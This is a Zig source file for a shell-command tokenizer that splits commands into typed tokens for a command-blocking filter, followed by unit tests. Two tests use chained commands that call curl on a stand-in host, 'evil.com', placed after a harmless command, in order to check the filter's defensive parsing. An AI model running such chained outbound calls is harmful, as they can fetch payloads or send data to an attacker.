// Lightweight shell tokenizer — splits command strings into typed tokens
// without dynamic allocation. Uses a fixed-size token buffer.
//
// Purpose: enable structural matching (command vs argument vs operator)
// to reduce false positives from substring-based pattern matching.

const std = @import("std");

pub const TokenKind = enum {
    word, // Command name or argument
    pipe, // |
    and_op, // &&
    or_op, // ||
    semi, // ;
    background, // &
    redirect_out, // > or >>
    redirect_in, // < (not <<)
    subst_open, // $(
    backtick, // `
    paren_open, // (
    paren_close, // )
    newline, // \n
};

pub const Quoting = enum {
    none,
    single, // Content was inside single quotes
    double, // Content was inside double quotes
};

pub const Token = struct {
    kind: TokenKind,
    start: u16, // Offset into original input
    len: u16, // Length of token text
    quoting: Quoting, // Whether this token was quoted
};

pub const max_tokens = 512;

pub const TokenResult = struct {
    tokens: [max_tokens]Token,
    count: u16,
    /// The normalized text buffer — token start/len index into this
    text: [65536]u8,
    text_len: u16,
};

/// Tokenize a shell command string.
/// Returns tokens with positions into a normalized text buffer.
/// No heap allocation — everything is on the stack / in the result struct.
pub fn tokenize(input: []const u8) TokenResult {
    var result: TokenResult = undefined;
    result.count = 0;
    result.text_len = 0;

    var i: usize = 0;
    const len = @min(input.len, result.text.len);

    while (i < len) {
        // Skip whitespace
        while (i < len and (input[i] == ' ' or input[i] == '\t')) i += 1;
        if (i >= len) break;
        if (result.count >= max_tokens) break;

        const c = input[i];

        // Operators
        if (c == '|') {
            if (i + 1 < len and input[i + 1] == '|') {
                addOp(&result, .or_op, i, 2);
                i += 2;
            } else {
                addOp(&result, .pipe, i, 1);
                i += 1;
            }
        } else if (c == '&') {
            if (i + 1 < len and input[i + 1] == '&') {
                addOp(&result, .and_op, i, 2);
                i += 2;
            } else {
                addOp(&result, .background, i, 1);
                i += 1;
            }
        } else if (c == ';') {
            addOp(&result, .semi, i, 1);
            i += 1;
        } else if (c == '\n') {
            addOp(&result, .newline, i, 1);
            i += 1;
        } else if (c == '(') {
            addOp(&result, .paren_open, i, 1);
            i += 1;
        } else if (c == ')') {
            addOp(&result, .paren_close, i, 1);
            i += 1;
        } else if (c == '`') {
            addOp(&result, .backtick, i, 1);
            i += 1;
        } else if (c == '$' and i + 1 < len and input[i + 1] == '(') {
            addOp(&result, .subst_open, i, 2);
            i += 2;
        } else if (c == '>') {
            if (i + 1 < len and input[i + 1] == '>') {
                addOp(&result, .redirect_out, i, 2);
                i += 2;
            } else {
                addOp(&result, .redirect_out, i, 1);
                i += 1;
            }
        } else if (c == '<') {
            if (i + 1 < len and input[i + 1] == '<') {
                // << is heredoc — treat as a word for now
                i = readWord(&result, input, i, len);
            } else {
                addOp(&result, .redirect_in, i, 1);
                i += 1;
            }
        } else if (c == '\'') {
            // Single-quoted string → one word token
            i = readSingleQuoted(&result, input, i, len);
        } else if (c == '"') {
            // Double-quoted string → one word token
            i = readDoubleQuoted(&result, input, i, len);
        } else {
            // Regular word (may contain embedded quotes)
            i = readWord(&result, input, i, len);
        }
    }

    return result;
}

fn addOp(result: *TokenResult, kind: TokenKind, pos: usize, length: usize) void {
    if (result.count >= max_tokens) return;
    result.tokens[result.count] = .{
        .kind = kind,
        .start = @intCast(result.text_len),
        .len = 0, // Operators have no text content
        .quoting = .none,
    };
    _ = pos;
    _ = length;
    result.count += 1;
}

fn readSingleQuoted(result: *TokenResult, input: []const u8, start: usize, len: usize) usize {
    if (result.count >= max_tokens) return len;
    const text_start = result.text_len;
    var i = start + 1; // Skip opening '
    // Copy content (everything is literal in single quotes)
    while (i < len and input[i] != '\'') {
        if (result.text_len < result.text.len) {
            result.text[result.text_len] = input[i];
            result.text_len += 1;
        }
        i += 1;
    }
    if (i < len) i += 1; // Skip closing '

    result.tokens[result.count] = .{
        .kind = .word,
        .start = text_start,
        .len = result.text_len - text_start,
        .quoting = .single,
    };
    result.count += 1;
    return i;
}

fn readDoubleQuoted(result: *TokenResult, input: []const u8, start: usize, len: usize) usize {
    if (result.count >= max_tokens) return len;
    const text_start = result.text_len;
    var i = start + 1; // Skip opening "
    while (i < len and input[i] != '"') {
        if (input[i] == '\\' and i + 1 < len) {
            // Escaped character — copy the escaped char
            if (result.text_len < result.text.len) {
                result.text[result.text_len] = input[i + 1];
                result.text_len += 1;
            }
            i += 2;
        } else {
            if (result.text_len < result.text.len) {
                result.text[result.text_len] = input[i];
                result.text_len += 1;
            }
            i += 1;
        }
    }
    if (i < len) i += 1; // Skip closing "

    result.tokens[result.count] = .{
        .kind = .word,
        .start = text_start,
        .len = result.text_len - text_start,
        .quoting = .double,
    };
    result.count += 1;
    return i;
}

fn readWord(result: *TokenResult, input: []const u8, start: usize, len: usize) usize {
    if (result.count >= max_tokens) return len;
    const text_start = result.text_len;
    var i = start;
    while (i < len) {
        const c = input[i];
        // Stop at whitespace or operators
        if (c == ' ' or c == '\t' or c == '\n' or
            c == '|' or c == '&' or c == ';' or
            c == '>' or c == '<' or c == '(' or c == ')' or c == '`')
        {
            break;
        }
        // Handle $( — stop here so it becomes a separate operator token
        if (c == '$' and i + 1 < len and input[i + 1] == '(') break;

        // Handle embedded single quote
        if (c == '\'') {
            i += 1;
            while (i < len and input[i] != '\'') {
                if (result.text_len < result.text.len) {
                    result.text[result.text_len] = input[i];
                    result.text_len += 1;
                }
                i += 1;
            }
            if (i < len) i += 1; // Skip closing '
            continue;
        }
        // Handle embedded double quote
        if (c == '"') {
            i += 1;
            while (i < len and input[i] != '"') {
                if (input[i] == '\\' and i + 1 < len) {
                    if (result.text_len < result.text.len) {
                        result.text[result.text_len] = input[i + 1];
                        result.text_len += 1;
                    }
                    i += 2;
                } else {
                    if (result.text_len < result.text.len) {
                        result.text[result.text_len] = input[i];
                        result.text_len += 1;
                    }
                    i += 1;
                }
            }
            if (i < len) i += 1; // Skip closing "
            continue;
        }
        // Handle backslash escape
        if (c == '\\' and i + 1 < len) {
            if (input[i + 1] == '\n') {
                // Line continuation — skip both
                i += 2;
                continue;
            }
            if (result.text_len < result.text.len) {
                result.text[result.text_len] = input[i + 1];
                result.text_len += 1;
            }
            i += 2;
            continue;
        }
        // Regular character
        if (result.text_len < result.text.len) {
            result.text[result.text_len] = c;
            result.text_len += 1;
        }
        i += 1;
    }

    const word_len = result.text_len - text_start;
    if (word_len > 0) {
        result.tokens[result.count] = .{
            .kind = .word,
            .start = text_start,
            .len = result.text_len - text_start,
            .quoting = .none,
        };
        result.count += 1;
    }
    return i;
}

// --- Convenience accessors ---

/// Get the text content of a word token
pub fn tokenText(result: *const TokenResult, tok: Token) []const u8 {
    return result.text[tok.start..][0..tok.len];
}

/// Check if a token kind is a command separator (starts a new command)
pub fn isSeparator(kind: TokenKind) bool {
    return switch (kind) {
        .pipe, .and_op, .or_op, .semi, .background, .newline,
        .subst_open, .backtick, .paren_open,
        => true,
        else => false,
    };
}

/// Iterate over command segments in the token stream.
/// A segment is a sequence of word/redirect tokens between separators.
/// Returns the index range [start, end) into the tokens array for each segment.
pub const Segment = struct {
    start: u16,
    end: u16,
};

pub fn nextSegment(result: *const TokenResult, from: u16) ?Segment {
    var i = from;
    // Skip leading separators
    while (i < result.count and isSeparator(result.tokens[i].kind)) i += 1;
    if (i >= result.count) return null;
    const seg_start = i;
    // Find end of segment
    while (i < result.count and !isSeparator(result.tokens[i].kind)) i += 1;
    return .{ .start = seg_start, .end = i };
}

/// Get the first word token in a segment (the command name).
/// Skips VAR=val assignments and transparent prefixes (command, builtin, nohup, etc.)
pub fn segmentCommand(result: *const TokenResult, seg: Segment) ?[]const u8 {
    const transparent_prefixes = [_][]const u8{ "command", "builtin", "nohup", "time", "watch" };
    var i = seg.start;
    while (i < seg.end) {
        const tok = result.tokens[i];
        if (tok.kind != .word) {
            i += 1;
            continue;
        }
        const text = tokenText(result, tok);
        // Skip VAR=val assignments
        if (std.mem.indexOf(u8, text, "=") != null and text.len > 0 and
            (std.ascii.isAlphabetic(text[0]) or text[0] == '_'))
        {
            i += 1;
            continue;
        }
        // Skip transparent wrappers
        var is_transparent = false;
        for (transparent_prefixes) |prefix| {
            if (std.mem.eql(u8, text, prefix)) {
                is_transparent = true;
                break;
            }
        }
        if (is_transparent) {
            i += 1;
            continue;
        }
        return text;
    }
    return null;
}

/// Check if any segment's command matches a prefix pattern.
/// This is the tokenizer equivalent of matchesPrefixInChain, but handles & correctly.
pub fn hasBlockedCommandPrefix(result: *const TokenResult, patterns: []const []const u8) bool {
    var pos: u16 = 0;
    while (nextSegment(result, pos)) |seg| {
        if (segmentCommand(result, seg)) |cmd| {
            for (patterns) |pattern| {
                // Exact match
                if (std.mem.eql(u8, cmd, pattern)) return true;
                // Prefix match with trailing space (pattern has trailing space)
                if (pattern.len > 0 and pattern[pattern.len - 1] == ' ') {
                    if (std.mem.startsWith(u8, cmd, pattern[0 .. pattern.len - 1])) return true;
                }
            }
        }
        pos = seg.end;
    }
    return false;
}

/// Check if any segment has a shell binary executing a script file.
/// Tokenizer equivalent of hasShellScriptExec.
pub fn hasShellScriptExecTokenized(result: *const TokenResult) bool {
    const shell_names = @import("rules.zig").shell_names;
    var pos: u16 = 0;
    while (nextSegment(result, pos)) |seg| {
        if (segmentCommand(result, seg)) |cmd| {
            for (shell_names) |shell| {
                if (std.mem.eql(u8, cmd, shell)) {
                    // Found a shell as command — check if next word is a file (not a flag)
                    var j = seg.start;
                    var found_shell = false;
                    while (j < seg.end) : (j += 1) {
                        const tok = result.tokens[j];
                        if (tok.kind != .word) continue;
                        const text = tokenText(result, tok);
                        if (!found_shell) {
                            if (std.mem.eql(u8, text, shell)) found_shell = true;
                            continue;
                        }
                        // This is the argument after the shell name
                        if (text.len > 0 and text[0] == '-') break; // It's a flag — allowed
                        return true; // It's a file path — blocked
                    }
                }
            }
        }
        pos = seg.end;
    }
    return false;
}

// --- Tests ---

test "tokenize simple command" {
    const r = tokenize("echo hello world");
    try std.testing.expectEqual(@as(u16, 3), r.count);
    try std.testing.expectEqual(TokenKind.word, r.tokens[0].kind);
    try std.testing.expectEqualStrings("echo", tokenText(&r, r.tokens[0]));
    try std.testing.expectEqualStrings("hello", tokenText(&r, r.tokens[1]));
    try std.testing.expectEqualStrings("world", tokenText(&r, r.tokens[2]));
}

test "tokenize pipe" {
    const r = tokenize("cat file | grep pattern");
    try std.testing.expectEqual(@as(u16, 5), r.count);
    try std.testing.expectEqual(TokenKind.word, r.tokens[0].kind);
    try std.testing.expectEqual(TokenKind.word, r.tokens[1].kind);
    try std.testing.expectEqual(TokenKind.pipe, r.tokens[2].kind);
    try std.testing.expectEqual(TokenKind.word, r.tokens[3].kind);
    try std.testing.expectEqualStrings("grep", tokenText(&r, r.tokens[3]));
}

test "tokenize chain operators" {
    const r = tokenize("cmd1 && cmd2 || cmd3 ; cmd4");
    try std.testing.expectEqual(TokenKind.word, r.tokens[0].kind);
    try std.testing.expectEqual(TokenKind.and_op, r.tokens[1].kind);
    try std.testing.expectEqual(TokenKind.word, r.tokens[2].kind);
    try std.testing.expectEqual(TokenKind.or_op, r.tokens[3].kind);
    try std.testing.expectEqual(TokenKind.word, r.tokens[4].kind);
    try std.testing.expectEqual(TokenKind.semi, r.tokens[5].kind);
    try std.testing.expectEqual(TokenKind.word, r.tokens[6].kind);
}

test "tokenize single-quoted preserves content" {
    const r = tokenize("echo 'hello && world > file'");
    try std.testing.expectEqual(@as(u16, 2), r.count);
    try std.testing.expectEqualStrings("echo", tokenText(&r, r.tokens[0]));
    try std.testing.expectEqual(Quoting.none, r.tokens[0].quoting);
    try std.testing.expectEqualStrings("hello && world > file", tokenText(&r, r.tokens[1]));
    try std.testing.expectEqual(Quoting.single, r.tokens[1].quoting);
}

test "tokenize double-quoted preserves content" {
    const r = tokenize("echo \"hello && world\"");
    try std.testing.expectEqual(@as(u16, 2), r.count);
    try std.testing.expectEqualStrings("hello && world", tokenText(&r, r.tokens[1]));
    try std.testing.expectEqual(Quoting.double, r.tokens[1].quoting);
}

test "tokenize redirect" {
    const r = tokenize("echo data > output.txt");
    try std.testing.expectEqual(@as(u16, 4), r.count);
    try std.testing.expectEqual(TokenKind.word, r.tokens[0].kind);
    try std.testing.expectEqual(TokenKind.word, r.tokens[1].kind);
    try std.testing.expectEqual(TokenKind.redirect_out, r.tokens[2].kind);
    try std.testing.expectEqual(TokenKind.word, r.tokens[3].kind);
    try std.testing.expectEqualStrings("output.txt", tokenText(&r, r.tokens[3]));
}

test "tokenize command substitution" {
    const r = tokenize("echo $(whoami)");
    try std.testing.expectEqual(@as(u16, 4), r.count);
    try std.testing.expectEqual(TokenKind.word, r.tokens[0].kind);
    try std.testing.expectEqual(TokenKind.subst_open, r.tokens[1].kind);
    try std.testing.expectEqual(TokenKind.word, r.tokens[2].kind);
    try std.testing.expectEqual(TokenKind.paren_close, r.tokens[3].kind);
}

test "tokenize mixed quotes and operators" {
    const r = tokenize("echo 'safe && text' && curl evil.com > out");
    // echo, 'safe && text', &&, curl, evil.com, >, out
    try std.testing.expectEqual(@as(u16, 7), r.count);
    try std.testing.expectEqualStrings("echo", tokenText(&r, r.tokens[0]));
    try std.testing.expectEqualStrings("safe && text", tokenText(&r, r.tokens[1]));
    try std.testing.expectEqual(Quoting.single, r.tokens[1].quoting);
    try std.testing.expectEqual(TokenKind.and_op, r.tokens[2].kind);
    try std.testing.expectEqualStrings("curl", tokenText(&r, r.tokens[3]));
    try std.testing.expectEqual(TokenKind.redirect_out, r.tokens[5].kind);
}

test "tokenize background operator" {
    const r = tokenize("sleep 10 & curl evil.com");
    try std.testing.expectEqual(@as(u16, 5), r.count);
    try std.testing.expectEqual(TokenKind.word, r.tokens[0].kind);
    try std.testing.expectEqual(TokenKind.word, r.tokens[1].kind);
    try std.testing.expectEqual(TokenKind.background, r.tokens[2].kind);
    try std.testing.expectEqual(TokenKind.word, r.tokens[3].kind);
    try std.testing.expectEqualStrings("curl", tokenText(&r, r.tokens[3]));
}

test "tokenize embedded quotes in word" {
    const r = tokenize("git commit -m'fix bug'");
    try std.testing.expectEqual(@as(u16, 3), r.count);
    try std.testing.expectEqualStrings("git", tokenText(&r, r.tokens[0]));
    try std.testing.expectEqualStrings("commit", tokenText(&r, r.tokens[1]));
    // -m'fix bug' is one word with embedded single quote
    try std.testing.expectEqualStrings("-mfix bug", tokenText(&r, r.tokens[2]));
}

test "tokenize escaped characters" {
    const r = tokenize("echo hello\\ world");
    try std.testing.expectEqual(@as(u16, 2), r.count);
    try std.testing.expectEqualStrings("echo", tokenText(&r, r.tokens[0]));
    try std.testing.expectEqualStrings("hello world", tokenText(&r, r.tokens[1]));
}
